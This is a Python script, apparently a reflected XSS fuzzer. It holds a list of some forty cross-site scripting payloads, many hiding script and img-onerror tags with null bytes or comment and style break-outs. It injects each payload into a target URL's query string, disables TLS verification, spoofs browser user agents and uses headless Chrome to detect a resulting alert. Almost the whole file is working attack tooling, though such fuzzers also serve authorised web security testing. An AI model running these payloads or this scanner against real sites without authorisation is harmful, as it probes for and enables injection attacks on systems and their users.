import sys
import random
import requests
import warnings

from selenium import webdriver
import chromedriver_autoinstaller
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse, quote

fuzzes = (
    '<s\x00c\x00r\x00i\x00p\x00t>a\x00l\x00e\x00r\x00t(1);</s\x00c\x00r\x00i\x00p\x00t>',
    '\x00<script>alert(1);</script>',
    '<s\x00cript>alert(1);</script>',
    '<script>\x00alert(1);</script>',
    '<script>a\x00lert(1);</script>',
    '<script>al\x00ert(1);</script>',
    '<script>alert(1);\x00</script>',
    '<script>alert(1);</\x00script>',
    '<script>alert(1);</sc\x00ript>',
    '<script>alert(1);</script\x00>',
    '<s\x00cript>alert(1);</s\x00cript>',
    '<script type="text/javascript">alert(1);</script>',
    '<script\x00type="text/javascript">javascript:alert(1);</script>',
    '<img src=1 href=1 onerror="javascript:alert(1)"></img>',
    '<image src=1 href=1 onerror="javascript:alert(1)"></image>',
    '<script src=1 href=1 onerror="javascript:alert(1)"></script>',
    '<script>javascript:alert(1)</script\x00',
    '<script charset="\x00>javascript:alert(1)</script>',
    '<script>/* *\x00/javascript:alert(1)// */</script>',
    '<style></style\x00<img src="about:blank" onerror=javascript:alert(1)//></style>',
    '<!--><img src=xxx:x onerror=javascript:alert(1)> -->',
    '--><!-- ---> <img src=xxx:x onerror=javascript:alert(1)> -->',
    '--><!-- --> <img src=xxx:x onerror=javascript:alert(1)> -->',
    '--><!-- --\x00> <img src=xxx:x onerror=javascript:alert(1)> -->',
    '<script\x00type="text/javascript">javascript:alert(1);</script>',
    '<script\x00>javascript:alert(1)</script>',
    '<script>javascript:alert(1)<\x00/script>',
    '<img src=# onerror\x00"javascript:alert(1)" >',
    '<input onfocus=javascript:alert(1) autofocus>',
    '<input onblur=javascript:alert(1) autofocus><input autofocus>',
    '<frameset onload=javascript:alert(1)>',
    '<!--<img src="--><img src=x onerror=javascript:alert(1)//">',
    '<style><img src="</style><img src=x onerror=javascript:alert(1)//">',
    '<? foo="><script>javascript:alert(1)</script>">',
    '<! foo="><script>javascript:alert(1)</script>">',
    '</ foo="><script>javascript:alert(1)</script>">',
    '<img \x00src=x onerror="alert(1)">',
    '<img \x00src=x onerror="javascript:alert(1)">',
    '<img src\x00=x onerror="javascript:alert(1)">',
    '<img src=x\x00onerror="javascript:alert(1)">',
    '<img src=x onerror=\x00"javascript:alert(1)">'
)

headers = {  # default headers
    'User-Agent': '$',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip,deflate',
    'Connection': 'close',
    'DNT': '1',
    'Upgrade-Insecure-Requests': '1'
}



def requester(url, headers):
    warnings.filterwarnings('ignore', message='Unverified HTTPS request')
    user_agents = ['Mozilla/5.0 (X11; Linux i686; rv:60.0) Gecko/20100101 Firefox/60.0',
                   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36'
                   'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36 OPR/43.0.2442.991']
    if headers['User-Agent'] == '$':
        headers['User-Agent'] = random.choice(user_agents)
    try:
        response = requests.get(url=url, timeout=10, verify=False)
    except:
        print('[Error in requester] : ', url)
        return -1

    try:
        options = webdriver.ChromeOptions()
        options.add_experimental_option('excludeSwitches', ['enable-logging'])
        options.add_argument("headless")
        path = chromedriver_autoinstaller.install()
        driver = webdriver.Chrome(executable_path=path, options=options)
        driver.get(url)
        result = driver.switch_to_alert()   # alert check
        print('\n[Alert] : '+url+'\n')
        result.dismiss()
    except:
        pass

    return response


def xssfuzzing(target):
    if requester(target, headers) == -1:
        sys.exit(-1)

    for fuzz in fuzzes:
        parts = urlparse(target)
        qsl = dict(parse_qsl(parts.query))
        if bool(qsl):
            qsl[list(qsl.keys())[0]] = fuzz
            parts = parts._replace(query=urlencode(qsl))
            new_target = urlunparse(parts)
        else:
            new_target = target+'?'+quote(fuzz)
        try:
            requester(new_target, headers)
        except:
            print('\n[Error] : '+new_target+'\n')
